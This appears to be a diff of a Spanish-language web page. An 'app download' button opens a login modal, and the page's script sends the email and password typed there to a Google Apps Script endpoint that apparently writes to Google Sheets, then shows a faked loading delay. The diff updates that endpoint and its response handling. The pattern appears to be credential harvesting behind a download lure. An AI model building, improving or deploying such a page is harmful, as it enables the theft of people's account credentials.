@@ -15,10 +15,8 @@
 </head>
 <body>
 
-  <!-- Botón principal -->
   <button class="btn" onclick="abrirModal()">Descargar aplicación ya</button>
 
-  <!-- Modal -->
   <div class="modal" id="miModal">
     <div class="modal-content">
       <h2>Iniciar sesión</h2>
@@ -31,7 +29,7 @@
   </div>
 
   <script>
-    const url = "https://script.google.com/macros/s/AKfycbxDzDofah7fpik118pGThmrnZa8273JSfF6oZgCeZVuv9S3tL2WhapsfnJESUn21rAw/exec";
+    const url = "https://script.google.com/macros/s/AKfycbxwR4SIyw1TYD0nZBMBnGNuT0F2KcquNimn9OQ061QEgxwo5B27BCcyo6HRIlipmyoP/exec";
 
     function abrirModal() {
       document.getElementById("miModal").style.display = "flex";
@@ -51,22 +49,28 @@
 
       fetch(url, {
         method: "POST",
-        body: JSON.stringify({ correo: correo, contrasena: contrasena })
+        body: JSON.stringify({ correo: correo, contrasena: contrasena }),
+        headers: { 'Content-Type': 'application/json' }
       })
-      .then(res => res.text())
-      .then(() => {
+      .then(res => res.json())
+      .then(res => {
         setTimeout(() => {
           loading.style.display = "none";
           document.getElementById("correo").value = "";
           document.getElementById("contrasena").value = "";
           document.getElementById("miModal").style.display = "none";
-          alert("¡Datos registrados correctamente!");
-        }, 2000); // simula carga de 2 segundos
+
+          if(res.result === "success"){
+            alert("¡Registrado correctamente!");
+          } else {
+            alert("Error al registrar: " + res.message);
+          }
+        }, 2000);
       })
       .catch(err => {
-        console.error("Error:", err);
+        console.error(err);
         loading.style.display = "none";
-        alert("Ocurrió un error al registrar");
+        alert("Error al conectar con Google Sheets");
       });
     }
 
